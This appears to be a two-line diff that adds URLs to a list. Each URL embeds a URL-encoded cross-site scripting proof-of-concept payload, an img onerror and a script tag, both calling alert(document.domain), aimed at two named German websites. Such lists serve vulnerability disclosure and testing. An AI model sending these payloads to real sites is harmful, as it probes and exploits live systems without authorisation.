@@ -1,0 +1,2 @@
+http://aw.cya.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://avs-outbackafrica.de/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
